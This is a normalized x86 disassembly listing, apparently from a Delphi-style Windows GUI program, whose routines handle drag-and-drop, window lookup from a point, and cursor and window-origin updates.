cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_431a0c
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_432978
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_432918
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_4329a4
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_432704
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_432978
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_4328c0
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_43b390
mov [ esi ] eax
sub_4329f4
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_4328c0
cmp eax 0x1
sbb eax eax
inc eax
sub_432a30
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_439e2c
test eax eax
je r-xdata
mov eax esi
call sub_439e2c
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_433460
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4138b8
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413914
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_439e40
mov edi eax
jmp r-xdata
sub_432ac4
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_4329a4
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43ce70
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_4329f4
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_4329f4
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_4346f8
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_4329f4
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453500
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_43ce2c
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_432a30
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403324
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_43cf58
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_43ce70
jmp r-xdata
mov eax [ rw-data ]
call sub_43cfcc
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_453500
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_4346f8
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403324
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403324
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407ae4
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_432d94
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_431fc0
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43ce70
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_432ac4
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_432f04
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_4330a9
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403324
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403324
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4322c8
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_432d94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4321b0
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_43b390
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_41245c
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_4346cc
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_41245c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_4330c8
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_403324
mov ebx eax
sub_43313c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_433408
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_433396
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_432008
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032d8
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x14 ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x18 ]
mov [ ebp - 0x6 ] edx
jmp r-xdata
mov [ ebp - 0x2 ] al
cmp [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
push ebp
call sub_4330c8
pop ecx
test al al
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x2 ] 0x0
je r-xdata
mov al 0x1
call sub_4329f4
test al al
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call SetCursor
mov eax [ rw-data ]
call sub_43cfcc
jmp r-xdata
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43339d
mov eax [ rw-data ]
call sub_403128
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_44c6fc
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
retn
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x0
mov eax [ ebp - 0x6 ]
push eax
mov al [ ebp - 0x2 ]
push eax
mov eax [ rw-data ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0xa ]
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx ]
mov al 0x3
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
xor ecx ecx
mov edx 0xb03a
mov eax [ rw-data ]
call sub_435d5c
jmp r-xdata
mov edx [ eax + 0x220 ]
cmp edx [ ebx + 0x38 ]
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ rw-data ]
add edx 0xc
push edx
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ecx [ rw-data ]
xchg edx eax
call sub_4328c0
mov al 0x4
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0xc ] ecx
mov edx [ rw-data ]
xor ecx ecx
mov [ edx + 0x10 ] ecx
xor edx edx
mov [ ebp - 0xa ] edx
xor edx edx
mov [ ebp - 0x6 ] edx
xor edx edx
call sub_450460
sub_43339d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov [ rw-data ] 0x0
retn
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_403128
mov eax [ rw-data ]
mov edx [ rw-data ]
call sub_4032b4
test al al
jne r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
sub_43342c
push ebx
push esi
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
call sub_431a40
mov esi eax
test esi esi
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_433460
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor esi esi
mov eax edi
call sub_43342c
mov ebp eax
test ebp ebp
je r-xdata
mov eax esi
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi ebp
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax ebp
call sub_4346f8
lea edx [ esp + 0x4 ]
mov ecx ebx
mov eax ebp
call sub_438c7c
test eax eax
je r-xdata
mov esi eax
sub_4334a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx esi
call sub_41375c
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebx ] eax
sub_4334d0
push ebx
mov ebx eax
mov eax [ ebx ]
call sub_4139fc
mov eax [ ebx ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx ]
call sub_403128
xor eax eax
mov [ ebx ] eax
sub_4334f0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
push esp
push ebx
call GetWindowOrgEx
push 0x0
mov eax [ esp + 0x8 ]
sub eax edi
push eax
mov eax [ esp + 0x8 ]
sub eax esi
push eax
push ebx
call SetWindowOrgEx
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_433520
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4335d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0xc ]
jne r-xdata
xor eax eax
push ebp
push sub_4335a9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
call sub_43375c
call sub_403960
call sub_403960
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4138b8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_41d318
test al al
je r-xdata
mov esp ebp
pop ebp
retn
sub_4335dc
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_413c24
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_43367a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433681
mov eax [ rw-data ]
call sub_413c88
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_433652
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_43375c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_41d374
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4138b8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_41d318
test al al
je r-xdata
sub_433688
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_43375c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41cf5c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_4336b4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41d51c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_41d520
mov eax [ ebp - 0x4 ]
call sub_4337a8
mov eax [ rw-data ]
call sub_413c24
mov ebx eax
xor eax eax
push ebp
push sub_433739
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x8 ] 0x4
jl r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
lea edx [ eax + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_41375c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413c88
retn
call sub_433520
sub_43375c
push ebx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
je r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_41d520
mov edx ebx
mov eax [ rw-data ]
call sub_413c38
mov eax [ ebx + 0x5c ]
push eax
mov eax [ ebx + 0x60 ]
push eax
call ReleaseDC
xor eax eax
mov [ ebx + 0x5c ] eax
sub_4337a8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x58 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4351ec
test al al
je r-xdata
and [ ebx + 0x54 ] 0xffffff7f
or [ ebx + 0x54 ] 0x80
jmp r-xdata
sub_4337d4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_433810
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_413f58
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_433858
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
jae r-xdata
mov [ esi + 0xc ] ecx
test ecx ecx
jbe r-xdata
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
jae r-xdata
mov [ esi + 0x10 ] ecx
mov eax [ esi + 0x8 ]
test eax eax
jbe r-xdata
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp eax ecx
jae r-xdata
mov [ esi + 0x14 ] ecx
mov eax [ esi + 0xc ]
test eax eax
jbe r-xdata
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
cmp eax ecx
jae r-xdata
mov [ esi + 0xc ] ecx
sub_433914
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1c ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4339e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4339e8
lea eax [ ebp - 0x1c ]
call sub_403e78
lea eax [ ebp - 0x8 ]
call sub_403e78
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403324
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_444534
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a84
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403ecc
sub_433a04
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_433a6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_441148
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_434bb4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x64 ]
pop eax
call sub_404284
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433a72
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov al 0x1
sub_433a78
push ebx
mov ebx eax
mov eax ebx
call sub_441170
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_433aac
push ebx
mov ebx eax
mov eax ebx
call sub_4411c0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_404284
je r-xdata
mov al 0x1
pop ebx
retn
sub_433ae4
push ebx
mov ebx eax
mov eax ebx
call sub_4411fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d8
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
